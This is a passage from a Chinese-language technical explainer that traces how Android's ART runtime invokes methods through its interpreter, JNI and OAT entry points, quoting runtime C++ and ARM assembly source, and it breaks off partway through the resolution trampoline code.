<p><code>InvokeWithVarArgs</code> 是执行函数的入口，定义在 <code>runtime/reflection.cc</code> ，最终是调用了 <code>ArtMethod::Invoke</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JValue InvokeWithVarArgs(const ScopedObjectAccessAlreadyRunnable&amp; soa, jobject obj, jmethodID mid,</span><br><span class="line">                         va_list args)</span><br><span class="line">    REQUIRES_SHARED(Locks::mutator_lock_) &#123;</span><br><span class="line">  // We want to make sure that the stack is not within a small distance from the</span><br><span class="line">  // protected region in case we are calling into a leaf function whose stack</span><br><span class="line">  // check has been elided.</span><br><span class="line">  if (UNLIKELY(__builtin_frame_address(0) &lt; soa.Self()-&gt;GetStackEnd())) &#123;</span><br><span class="line">    ThrowStackOverflowError(soa.Self());</span><br><span class="line">    return JValue();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ArtMethod* method = jni::DecodeArtMethod(mid);</span><br><span class="line">  bool is_string_init = method-&gt;GetDeclaringClass()-&gt;IsStringClass() &amp;&amp; method-&gt;IsConstructor();</span><br><span class="line">  if (is_string_init) &#123;</span><br><span class="line">    // Replace calls to String.&lt;init&gt; with equivalent StringFactory call.</span><br><span class="line">    method = WellKnownClasses::StringInitToStringFactory(method);</span><br><span class="line">  &#125;</span><br><span class="line">  ObjPtr&lt;mirror::Object&gt; receiver = method-&gt;IsStatic() ? nullptr : soa.Decode&lt;mirror::Object&gt;(obj);</span><br><span class="line">  uint32_t shorty_len = 0;</span><br><span class="line">  const char* shorty =</span><br><span class="line">      method-&gt;GetInterfaceMethodIfProxy(kRuntimePointerSize)-&gt;GetShorty(&amp;shorty_len);</span><br><span class="line">  JValue result;</span><br><span class="line">  ArgArray arg_array(shorty, shorty_len);</span><br><span class="line">  arg_array.BuildArgArrayFromVarArgs(soa, receiver, args);</span><br><span class="line">  /*</span><br><span class="line">  关键函数</span><br><span class="line">  */</span><br><span class="line">  InvokeWithArgArray(soa, method, &amp;arg_array, &amp;result, shorty);</span><br><span class="line">  if (is_string_init) &#123;</span><br><span class="line">    // For string init, remap original receiver to StringFactory result.</span><br><span class="line">    UpdateReference(soa.Self(), obj, result.GetL());</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void InvokeWithArgArray(const ScopedObjectAccessAlreadyRunnable&amp; soa,</span><br><span class="line">                               ArtMethod* method, ArgArray* arg_array, JValue* result,</span><br><span class="line">                               const char* shorty)</span><br><span class="line">    REQUIRES_SHARED(Locks::mutator_lock_) &#123;</span><br><span class="line">  uint32_t* args = arg_array-&gt;GetArray();</span><br><span class="line">  if (UNLIKELY(soa.Env()-&gt;IsCheckJniEnabled())) &#123;</span><br><span class="line">    CheckMethodArguments(soa.Vm(), method-&gt;GetInterfaceMethodIfProxy(kRuntimePointerSize), args);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /*</span><br><span class="line">  关键函数</span><br><span class="line">  */</span><br><span class="line">  method-&gt;Invoke(soa.Self(), args, arg_array-&gt;GetNumBytes(), result, shorty);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们知道 <code>ART</code> 的运行模式是 <code>AOT</code> 的，在 <code>apk</code> 安装的时候，每个 <code>DexMethod</code> 都会由 <code>dex2oat</code> 编译成目标代码，而不再是虚拟机执行的字节码，但同时 <code>Dex</code> 字节码仍然还在 <code>OAT</code> 里存在，所以 <code>ART</code> 的代码执行既支持 <code>QuickCompiledCode</code> 模式，也同时支持解释器模式以及 <code>JIT</code> 执行模式。看 <code>ArtMethod::Invoke</code> 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void ArtMethod::Invoke(Thread* self, uint32_t* args, uint32_t args_size, JValue* result,</span><br><span class="line">                       const char* shorty) &#123;</span><br><span class="line">  if (UNLIKELY(__builtin_frame_address(0) &lt; self-&gt;GetStackEnd())) &#123;</span><br><span class="line">    ThrowStackOverflowError(self);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  if (kIsDebugBuild) &#123;</span><br><span class="line">    self-&gt;AssertThreadSuspensionIsAllowable();</span><br><span class="line">    CHECK_EQ(kRunnable, self-&gt;GetState());</span><br><span class="line">    CHECK_STREQ(GetInterfaceMethodIfProxy(kRuntimePointerSize)-&gt;GetShorty(), shorty);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Push a transition back into managed code onto the linked list in thread.</span><br><span class="line">  ManagedStack fragment;</span><br><span class="line">  self-&gt;PushManagedStackFragment(&amp;fragment);</span><br><span class="line"></span><br><span class="line">  Runtime* runtime = Runtime::Current();</span><br><span class="line">  // Call the invoke stub, passing everything as arguments.</span><br><span class="line">  // If the runtime is not yet started or it is required by the debugger, then perform the</span><br><span class="line">  // Invocation by the interpreter, explicitly forcing interpretation over JIT to prevent</span><br><span class="line">  // cycling around the various JIT/Interpreter methods that handle method invocation.</span><br><span class="line">  if (UNLIKELY(!runtime-&gt;IsStarted() || Dbg::IsForcedInterpreterNeededForCalling(self, this))) &#123;</span><br><span class="line">    /*</span><br><span class="line">      Interpreter 模式</span><br><span class="line">    */</span><br><span class="line">    if (IsStatic()) &#123;</span><br><span class="line">      art::interpreter::EnterInterpreterFromInvoke(</span><br><span class="line">          self, this, nullptr, args, result, /*stay_in_interpreter*/ true);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      mirror::Object* receiver =</span><br><span class="line">          reinterpret_cast&lt;StackReference&lt;mirror::Object&gt;*&gt;(&amp;args[0])-&gt;AsMirrorPtr();</span><br><span class="line">      art::interpreter::EnterInterpreterFromInvoke(</span><br><span class="line">          self, this, receiver, args + 1, result, /*stay_in_interpreter*/ true);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    DCHECK_EQ(runtime-&gt;GetClassLinker()-&gt;GetImagePointerSize(), kRuntimePointerSize);</span><br><span class="line"></span><br><span class="line">    constexpr bool kLogInvocationStartAndReturn = false;</span><br><span class="line">    bool have_quick_code = GetEntryPointFromQuickCompiledCode() != nullptr;</span><br><span class="line">    if (LIKELY(have_quick_code)) &#123;</span><br><span class="line">      if (kLogInvocationStartAndReturn) &#123;</span><br><span class="line">        LOG(INFO) &lt;&lt; StringPrintf(</span><br><span class="line">            &quot;Invoking &#x27;%s&#x27; quick code=%p static=%d&quot;, PrettyMethod().c_str(),</span><br><span class="line">            GetEntryPointFromQuickCompiledCode(), static_cast&lt;int&gt;(IsStatic() ? 1 : 0));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      // Ensure that we won&#x27;t be accidentally calling quick compiled code when -Xint.</span><br><span class="line">      if (kIsDebugBuild &amp;&amp; runtime-&gt;GetInstrumentation()-&gt;IsForcedInterpretOnly()) &#123;</span><br><span class="line">        CHECK(!runtime-&gt;UseJitCompilation());</span><br><span class="line">        const void* oat_quick_code =</span><br><span class="line">            (IsNative() || !IsInvokable() || IsProxyMethod() || IsObsolete())</span><br><span class="line">            ? nullptr</span><br><span class="line">            : GetOatMethodQuickCode(runtime-&gt;GetClassLinker()-&gt;GetImagePointerSize());</span><br><span class="line">        CHECK(oat_quick_code == nullptr || oat_quick_code != GetEntryPointFromQuickCompiledCode())</span><br><span class="line">            &lt;&lt; &quot;Don&#x27;t call compiled code when -Xint &quot; &lt;&lt; PrettyMethod();</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      /*</span><br><span class="line">        OAT 模式</span><br><span class="line">      */</span><br><span class="line">      if (!IsStatic()) &#123;</span><br><span class="line">        (*art_quick_invoke_stub)(this, args, args_size, self, result, shorty);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        (*art_quick_invoke_static_stub)(this, args, args_size, self, result, shorty);</span><br><span class="line">      &#125;</span><br><span class="line">      if (UNLIKELY(self-&gt;GetException() == Thread::GetDeoptimizationException())) &#123;</span><br><span class="line">        // Unusual case where we were running generated code and an</span><br><span class="line">        // exception was thrown to force the activations to be removed from the</span><br><span class="line">        // stack. Continue execution in the interpreter.</span><br><span class="line">        self-&gt;DeoptimizeWithDeoptimizationException(result);</span><br><span class="line">      &#125;</span><br><span class="line">      if (kLogInvocationStartAndReturn) &#123;</span><br><span class="line">        LOG(INFO) &lt;&lt; StringPrintf(&quot;Returned &#x27;%s&#x27; quick code=%p&quot;, PrettyMethod().c_str(),</span><br><span class="line">                                  GetEntryPointFromQuickCompiledCode());</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      LOG(INFO) &lt;&lt; &quot;Not invoking &#x27;&quot; &lt;&lt; PrettyMethod() &lt;&lt; &quot;&#x27; code=null&quot;;</span><br><span class="line">      if (result != nullptr) &#123;</span><br><span class="line">        result-&gt;SetJ(0);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // Pop transition.</span><br><span class="line">  self-&gt;PopManagedStackFragment(fragment);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>Invoke</code> 可以进入 <code>OAT</code> ，<code>Interpreter</code> 模式执行 <code>Method</code> 。如果当前是 <code>Interpreter</code> 模式，就调用 <code>art::interpreter::EnterInterpreterFromInvoke</code> ，如果是 <code>OAT</code> 模式，就调用 <code>art_quick_invoke_stub/art_quick_invoke_static_stub</code> 。<br><code>EnterInterpreterFromInvoke</code> 函数里会判断是 <code>native</code> 还是解释器执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void EnterInterpreterFromInvoke(Thread* self, ArtMethod* method, Object* receiver,</span><br><span class="line">                                uint32_t* args, JValue* result) &#123;</span><br><span class="line">  DCHECK_EQ(self, Thread::Current());</span><br><span class="line">  bool implicit_check = !Runtime::Current()-&gt;ExplicitStackOverflowChecks();</span><br><span class="line">  if (UNLIKELY(__builtin_frame_address(0) &lt; self-&gt;GetStackEndForInterpreter(implicit_check))) &#123;</span><br><span class="line">    ThrowStackOverflowError(self);</span><br><span class="line">    return;</span><br><span class="line">  &#125;</span><br><span class="line"> </span><br><span class="line">  const char* old_cause = self-&gt;StartAssertNoThreadSuspension(&quot;EnterInterpreterFromInvoke&quot;);</span><br><span class="line">  const DexFile::CodeItem* code_item = method-&gt;GetCodeItem();</span><br><span class="line">  uint16_t num_regs;</span><br><span class="line">  uint16_t num_ins;</span><br><span class="line">  if (code_item != nullptr) &#123;</span><br><span class="line">    num_regs =  code_item-&gt;registers_size_;</span><br><span class="line">    num_ins = code_item-&gt;ins_size_;</span><br><span class="line">  &#125; else if (method-&gt;IsAbstract()) &#123;</span><br><span class="line">    self-&gt;EndAssertNoThreadSuspension(old_cause);</span><br><span class="line">    ThrowAbstractMethodError(method);</span><br><span class="line">    return;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    DCHECK(method-&gt;IsNative());</span><br><span class="line">    num_regs = num_ins = ArtMethod::NumArgRegisters(method-&gt;GetShorty());</span><br><span class="line">    if (!method-&gt;IsStatic()) &#123;</span><br><span class="line">      num_regs++;</span><br><span class="line">      num_ins++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  // Set up shadow frame with matching number of reference slots to vregs.</span><br><span class="line">  ShadowFrame* last_shadow_frame = self-&gt;GetManagedStack()-&gt;GetTopShadowFrame();</span><br><span class="line">  void* memory = alloca(ShadowFrame::ComputeSize(num_regs));</span><br><span class="line">  ShadowFrame* shadow_frame(ShadowFrame::Create(num_regs, last_shadow_frame, method, 0, memory));</span><br><span class="line">  self-&gt;PushShadowFrame(shadow_frame);</span><br><span class="line"> </span><br><span class="line">  size_t cur_reg = num_regs - num_ins;</span><br><span class="line">  if (!method-&gt;IsStatic()) &#123;</span><br><span class="line">    CHECK(receiver != nullptr);</span><br><span class="line">    shadow_frame-&gt;SetVRegReference(cur_reg, receiver);</span><br><span class="line">    ++cur_reg;</span><br><span class="line">  &#125;</span><br><span class="line">  uint32_t shorty_len = 0;</span><br><span class="line">  const char* shorty = method-&gt;GetShorty(&amp;shorty_len);</span><br><span class="line">  for (size_t shorty_pos = 0, arg_pos = 0; cur_reg &lt; num_regs; ++shorty_pos, ++arg_pos, cur_reg++) &#123;</span><br><span class="line">    DCHECK_LT(shorty_pos + 1, shorty_len);</span><br><span class="line">    switch (shorty[shorty_pos + 1]) &#123;</span><br><span class="line">      case &#x27;L&#x27;: &#123;</span><br><span class="line">        Object* o = reinterpret_cast&lt;StackReference&lt;Object&gt;*&gt;(&amp;args[arg_pos])-&gt;AsMirrorPtr();</span><br><span class="line">        shadow_frame-&gt;SetVRegReference(cur_reg, o);</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      case &#x27;J&#x27;: case &#x27;D&#x27;: &#123;</span><br><span class="line">        uint64_t wide_value = (static_cast&lt;uint64_t&gt;(args[arg_pos + 1]) &lt;&lt; 32) | args[arg_pos];</span><br><span class="line">        shadow_frame-&gt;SetVRegLong(cur_reg, wide_value);</span><br><span class="line">        cur_reg++;</span><br><span class="line">        arg_pos++;</span><br><span class="line">        break;</span><br><span class="line">      &#125;</span><br><span class="line">      default:</span><br><span class="line">        shadow_frame-&gt;SetVReg(cur_reg, args[arg_pos]);</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  self-&gt;EndAssertNoThreadSuspension(old_cause);</span><br><span class="line">  // Do this after populating the shadow frame in case EnsureInitialized causes a GC.</span><br><span class="line">  if (method-&gt;IsStatic() &amp;&amp; UNLIKELY(!method-&gt;GetDeclaringClass()-&gt;IsInitialized())) &#123;</span><br><span class="line">    ClassLinker* class_linker = Runtime::Current()-&gt;GetClassLinker();</span><br><span class="line">    StackHandleScope&lt;1&gt; hs(self);</span><br><span class="line">    Handle&lt;mirror::Class&gt; h_class(hs.NewHandle(method-&gt;GetDeclaringClass()));</span><br><span class="line">    if (UNLIKELY(!class_linker-&gt;EnsureInitialized(self, h_class, true, true))) &#123;</span><br><span class="line">      CHECK(self-&gt;IsExceptionPending());</span><br><span class="line">      self-&gt;PopShadowFrame();</span><br><span class="line">      return;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  if (LIKELY(!method-&gt;IsNative())) &#123;</span><br><span class="line">    /*</span><br><span class="line">      非 native 方法则调用下列函数</span><br><span class="line">    */</span><br><span class="line">    JValue r = Execute(self, code_item, *shadow_frame, JValue());</span><br><span class="line">    if (result != nullptr) &#123;</span><br><span class="line">      *result = r;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // We don&#x27;t expect to be asked to interpret native code (which is entered via a JNI compiler</span><br><span class="line">    // generated stub) except during testing and image writing.</span><br><span class="line">    // Update args to be the args in the shadow frame since the input ones could hold stale</span><br><span class="line">    // references pointers due to moving GC.</span><br><span class="line">    args = shadow_frame-&gt;GetVRegArgs(method-&gt;IsStatic() ? 0 : 1);</span><br><span class="line">    if (!Runtime::Current()-&gt;IsStarted()) &#123;</span><br><span class="line">      UnstartedRuntime::Jni(self, method, receiver, args, result);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      InterpreterJni(self, method, shorty, receiver, args, result);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  self-&gt;PopShadowFrame();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数前面部分都在做参数压栈操作，最后几行进入主题，如果不是 <code>Native</code> ，那么调用 <code>Execute</code> 执行； <code>Native</code> 函数则调用 <code>InterpreterJni</code> 。 <code>Execute</code> 就是 <code>art</code> 的解释器代码， <code>Dex</code> 的字节码是通过 <code>ArtMethod::GetCodeItem</code> 函数获得，由 <code>Execute</code> 逐条执行。 <code>InterpreterJni</code> 通过 <code>GetEntryPointFromJni</code> 来获得 <code>native</code> 的函数，并执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if (LIKELY(!method-&gt;IsNative())) &#123;</span><br><span class="line">    JValue r = Execute(self, code_item, *shadow_frame, JValue());</span><br><span class="line">    if (result != nullptr) &#123;</span><br><span class="line">      *result = r;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    // We don&#x27;t expect to be asked to interpret native code (which is entered via a JNI compiler</span><br><span class="line">    // generated stub) except during testing and image writing.</span><br><span class="line">    // Update args to be the args in the shadow frame since the input ones could hold stale</span><br><span class="line">    // references pointers due to moving GC.</span><br><span class="line">    args = shadow_frame-&gt;GetVRegArgs(method-&gt;IsStatic() ? 0 : 1);</span><br><span class="line">    if (!Runtime::Current()-&gt;IsStarted()) &#123;</span><br><span class="line">      UnstartedRuntime::Jni(self, method, receiver, args, result);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      InterpreterJni(self, method, shorty, receiver, args, result);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>再回调 <code>OAT</code> 的模式， <code>art_quick_invoke_stub/art_quick_invoke_static_stub</code> 最终会调用到 <code>art_quick_invoke_stub_internal</code> (<code>arch/arm/quick_entrypoints_arm.S</code> )。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ENTRY art_quick_invoke_stub_internal</span><br><span class="line">    push   &#123;r4, r5, r6, r7, r8, r9, r10, r11, lr&#125;               @ spill regs</span><br><span class="line">    .cfi_adjust_cfa_offset 16</span><br><span class="line">    .cfi_rel_offset r4, 0</span><br><span class="line">    .cfi_rel_offset r5, 4</span><br><span class="line">    .cfi_rel_offset r6, 8</span><br><span class="line">    .cfi_rel_offset r7, 12</span><br><span class="line">    .cfi_rel_offset r8, 16</span><br><span class="line">    .cfi_rel_offset r9, 20</span><br><span class="line">    .cfi_rel_offset r10, 24</span><br><span class="line">    .cfi_rel_offset r11, 28</span><br><span class="line">    .cfi_rel_offset lr, 32</span><br><span class="line">    mov    r11, sp                         @ save the stack pointer</span><br><span class="line">    .cfi_def_cfa_register r11</span><br><span class="line"> </span><br><span class="line">    mov    r9, r3                          @ move managed thread pointer into r9</span><br><span class="line"> </span><br><span class="line">    add    r4, r2, #4                      @ create space for method pointer in frame</span><br><span class="line">    sub    r4, sp, r4                      @ reserve &amp; align *stack* to 16 bytes: native calling</span><br><span class="line">    and    r4, #0xFFFFFFF0                 @ convention only aligns to 8B, so we have to ensure ART</span><br><span class="line">    mov    sp, r4                          @ 16B alignment ourselves.</span><br><span class="line"> </span><br><span class="line">    mov    r4, r0                          @ save method*</span><br><span class="line">    add    r0, sp, #4                      @ pass stack pointer + method ptr as dest for memcpy</span><br><span class="line">    bl     memcpy                          @ memcpy (dest, src, bytes)</span><br><span class="line">    mov    ip, #0                          @ set ip to 0</span><br><span class="line">    str    ip, [sp]                        @ store null for method* at bottom of frame</span><br><span class="line"> </span><br><span class="line">    ldr    ip, [r11, #48]                  @ load fp register argument array pointer</span><br><span class="line">    vldm   ip, &#123;s0-s15&#125;                    @ copy s0 - s15</span><br><span class="line"> </span><br><span class="line">    ldr    ip, [r11, #44]                  @ load core register argument array pointer</span><br><span class="line">    mov    r0, r4                          @ restore method*</span><br><span class="line">    add    ip, ip, #4                      @ skip r0</span><br><span class="line">    ldm    ip, &#123;r1-r3&#125;                     @ copy r1 - r3</span><br><span class="line">#ifdef ARM_R4_SUSPEND_FLAG</span><br><span class="line">    mov    r4, #SUSPEND_CHECK_INTERVAL     @ reset r4 to suspend check interval</span><br><span class="line">#endif</span><br><span class="line"> </span><br><span class="line">    ldr    ip, [r0, #ART_METHOD_QUICK_CODE_OFFSET_32]  @ get pointer to the code</span><br><span class="line">    blx    ip                              @ call the method</span><br><span class="line"> </span><br><span class="line">    mov    sp, r11                         @ restore the stack pointer</span><br><span class="line">    .cfi_def_cfa_register sp</span><br><span class="line"> </span><br><span class="line">    ldr    r4, [sp, #40]                   @ load result_is_float</span><br><span class="line">    ldr    r9, [sp, #36]                   @ load the result pointer</span><br><span class="line">    cmp    r4, #0</span><br><span class="line">    ite    eq</span><br><span class="line">    strdeq r0, [r9]                        @ store r0/r1 into result pointer</span><br><span class="line">    vstrne d0, [r9]                        @ store s0-s1/d0 into result pointer</span><br><span class="line"> </span><br><span class="line">    pop    &#123;r4, r5, r6, r7, r8, r9, r10, r11, pc&#125;               @ restore spill regs</span><br><span class="line">END art_quick_invoke_stub_internal</span><br></pre></td></tr></table></figure>

<p>找到 <code>ArtMethod</code> 的 <code>entry_point_from_quick_compiled_code_</code> 字段，这个就是 <code>EntryPointFromQuickCompiledCode</code> ，从而进入OAT函数执行。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#define ART_METHOD_QUICK_CODE_OFFSET_32 36</span><br><span class="line">ADD_TEST_EQ(ART_METHOD_QUICK_CODE_OFFSET_32,</span><br><span class="line">            art::ArtMethod::EntryPointFromQuickCompiledCodeOffset(4).Int32Value())</span><br></pre></td></tr></table></figure>

<p><code>EntryPointFromQuickCompiledCode</code> 的初始化在 <code>class_linker</code> 的 <code>LoadClassMembers</code> 时调用的 <code>LinkCode</code> ，有下面几种类型</p>
<ol>
<li><p>SetEntryPointFromQuickCompiledCode(GetQuickCode());   &#x2F;&#x2F; 这个是执行OatMethod</p>
</li>
<li><p>SetEntryPointFromQuickCompiledCode(GetQuickToInterpreterBridge());  &#x2F;&#x2F;  Dex Method</p>
</li>
<li><p>SetEntryPointFromQuickCompiledCode(GetQuickGenericJniStub())；  &#x2F;&#x2F; Native Method</p>
</li>
<li><p>SetEntryPointFromQuickCompiledCode(GetQuickResolutionStub());   &#x2F;&#x2F; method-&gt;IsStatic() &amp;&amp; !method-&gt;IsConstructor()</p>
</li>
</ol>
<p>如果是强制使用了解释器模式，那么执行的是代码 <code>GetQuickToInterpreterBridge(non-static, non-native)</code> 或 <code>GetQuickGenericJniStub(non-static, native)</code> 或 <code>GetQuickResolutionStub(static)</code> ，这几个 <code>EntryPoint</code> 对应的实际执行函数如下。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GetQuickGenericJniStub —  artQuickGenericJniTrampoline</span><br><span class="line"></span><br><span class="line">GetQuickResolutionStub —  artQuickResolutionTrampoline</span><br><span class="line"></span><br><span class="line">GetQuickToInterpreterBridge —  artQuickToInterpreterBridge</span><br></pre></td></tr></table></figure>
<p><code>ArtMthod</code> 被 <code>Resolve</code> 之后，如果是走 <code>Oat</code> 模式就会执行 <code>GetQuickCode</code> 。</p>
<p>以上是 <code>EntryPointFromQuickCompiledCode</code> 的情况。</p>
<p>不同的执行模式有不同的 <code>EntryPoint</code> 。</p>
<ol>
<li><p>解释器 - <code>EntryPointFromInterpreter</code></p>
<p> 在 <code>interpreter/interpreter_common.cc</code> 里会在执行解释器函数时，会获得 <code>ArtMethod</code> 的 <code>Interpret EntryPoint</code> 执行</p>
</li>
<li><p>Jni - <code> EntryPointFromJni</code></p>
<p> <code>interpreter/interpreter.cc</code>， <code>InterpreterJni</code> 函数会获得 <code>ArtMethod的Jni EntryPoint</code> 执行</p>
</li>
<li><p>Oat - <code>EntryPointFromQuickCompiledCode</code></p>
<p> <code>DexCache</code> 在 <code>Init</code> 的时候会将 <code>Method</code> 都初始化为 <code>ResolutionMethod</code> ，这个 <code>Resolution Method</code> 是没有 <code>dex method id</code> 的，是个 <code>RuntimeMethod</code> ，这是 <code>lazy load method</code> ，运行时 <code>resolve</code> 之后才会替换成实际的 <code>ArtMethod</code> 。</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">void DexCache::Init(const DexFile* dex_file, String* location, ObjectArray&lt;String&gt;* strings,</span><br><span class="line">                    ObjectArray&lt;Class&gt;* resolved_types, PointerArray* resolved_methods,</span><br><span class="line">                    PointerArray* resolved_fields, size_t pointer_size) &#123;</span><br><span class="line">  CHECK(dex_file != nullptr);</span><br><span class="line">  CHECK(location != nullptr);</span><br><span class="line">  CHECK(strings != nullptr);</span><br><span class="line">  CHECK(resolved_types != nullptr);</span><br><span class="line">  CHECK(resolved_methods != nullptr);</span><br><span class="line">  CHECK(resolved_fields != nullptr);</span><br><span class="line"> </span><br><span class="line">  SetDexFile(dex_file);</span><br><span class="line">  SetFieldObject&lt;false&gt;(OFFSET_OF_OBJECT_MEMBER(DexCache, location_), location);</span><br><span class="line">  SetFieldObject&lt;false&gt;(StringsOffset(), strings);</span><br><span class="line">  SetFieldObject&lt;false&gt;(ResolvedFieldsOffset(), resolved_fields);</span><br><span class="line">  SetFieldObject&lt;false&gt;(OFFSET_OF_OBJECT_MEMBER(DexCache, resolved_types_), resolved_types);</span><br><span class="line">  SetFieldObject&lt;false&gt;(ResolvedMethodsOffset(), resolved_methods);</span><br><span class="line"> </span><br><span class="line">  Runtime* const runtime = Runtime::Current();</span><br><span class="line">  if (runtime-&gt;HasResolutionMethod()) &#123;</span><br><span class="line">    // Initialize the resolve methods array to contain trampolines for resolution.</span><br><span class="line">    Fixup(runtime-&gt;GetResolutionMethod(), pointer_size);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">void DexCache::Fixup(ArtMethod* trampoline, size_t pointer_size) &#123;</span><br><span class="line">  // Fixup the resolve methods array to contain trampoline for resolution.</span><br><span class="line">  CHECK(trampoline != nullptr);</span><br><span class="line">  CHECK(trampoline-&gt;IsRuntimeMethod());</span><br><span class="line">  auto* resolved_methods = GetResolvedMethods();</span><br><span class="line">  for (size_t i = 0, length = resolved_methods-&gt;GetLength(); i &lt; length; i++) &#123;</span><br><span class="line">    if (resolved_methods-&gt;GetElementPtrSize&lt;ArtMethod*&gt;(i, pointer_size) == nullptr) &#123;</span><br><span class="line">      resolved_methods-&gt;SetElementPtrSize(i, trampoline, pointer_size);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>resolution method</code> 的 <code>EntryPointFromQuickCompiledCode</code> 指向 <code>GetQuickResolutionStub</code> ，意思就是一开始，这些函数的执行点都是从 <code>artQuickResolutionTrampoline</code> 开始。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// Lazily resolve a method for quick. Called by stub code.</span><br><span class="line">extern &quot;C&quot; const void* artQuickResolutionTrampoline(</span><br><span class="line">    ArtMethod* called, mirror::Object* receiver, Thread* self, ArtMethod** sp)</span><br><span class="line">    SHARED_LOCKS_REQUIRED(Locks::mutator_lock_) &#123;</span><br><span class="line">  ScopedQuickEntrypointChecks sqec(self);</span><br><span class="line">  // Start new JNI local reference state</span><br><span class="line">  JNIEnvExt* env = self-&gt;GetJniEnv();</span><br><span class="line">  ScopedObjectAccessUnchecked soa(env);</span><br><span class="line">  ScopedJniEnvLocalRefState env_state(env);</span><br><span class="line">  const char* old_cause = self-&gt;StartAssertNoThreadSuspension(&quot;Quick method resolution set up&quot;);</span><br><span class="line"> </span><br><span class="line">  // Compute details about the called method (avoid GCs)</span><br><span class="line">  ClassLinker* linker = Runtime::Current()-&gt;GetClassLinker();</span><br><span class="line">  ArtMethod* caller = QuickArgumentVisitor::GetCallingMethod(sp);</span><br><span class="line">  InvokeType invoke_type;</span><br><span class="line">  MethodReference called_method(nullptr, 0);</span><br><span class="line">  const bool called_method_known_on_entry = !called-&gt;IsRuntimeMethod();</span><br><span class="line">  if (!called_method_known_on_entry) &#123;</span><br><span class="line">    uint32_t dex_pc = caller-&gt;ToDexPc(QuickArgumentVisitor::GetCallingPc(sp));</span><br><span class="line">    const DexFile::CodeItem* code;</span><br><span class="line">    called_method.dex_file = caller-&gt;GetDexFile();</span><br><span class="line">    code = caller-&gt;GetCodeItem();</span><br><span class="line">    CHECK_LT(dex_pc, code-&gt;insns_size_in_code_units_);</span><br><span class="line">    const Instruction* instr = Instruction::At(&amp;code-&gt;insns_[dex_pc]);</span><br><span class="line">    Instruction::Code instr_code = instr-&gt;Opcode();</span><br><span class="line">    bool is_range;</span><br><span class="line">    switch (instr_code) &#123;</span><br><span class="line">      case Instruction::INVOKE_DIRECT:</span><br><span class="line">        invoke_type = kDirect;</span><br><span class="line">        is_range = false;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_DIRECT_RANGE:</span><br><span class="line">        invoke_type = kDirect;</span><br><span class="line">        is_range = true;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_STATIC:</span><br><span class="line">        invoke_type = kStatic;</span><br><span class="line">        is_range = false;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_STATIC_RANGE:</span><br><span class="line">        invoke_type = kStatic;</span><br><span class="line">        is_range = true;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_SUPER:</span><br><span class="line">        invoke_type = kSuper;</span><br><span class="line">        is_range = false;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_SUPER_RANGE:</span><br><span class="line">        invoke_type = kSuper;</span><br><span class="line">        is_range = true;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_VIRTUAL:</span><br><span class="line">        invoke_type = kVirtual;</span><br><span class="line">        is_range = false;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_VIRTUAL_RANGE:</span><br><span class="line">        invoke_type = kVirtual;</span><br><span class="line">        is_range = true;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_INTERFACE:</span><br><span class="line">        invoke_type = kInterface;</span><br><span class="line">        is_range = false;</span><br><span class="line">        break;</span><br><span class="line">      case Instruction::INVOKE_INTERFACE_RANGE:</span><br><span class="line">        invoke_type = kInterface;</span><br><span class="line">        is_range = true;</span><br><span class="line">        break;</span><br><span class="line">      default:</span><br><span class="line">        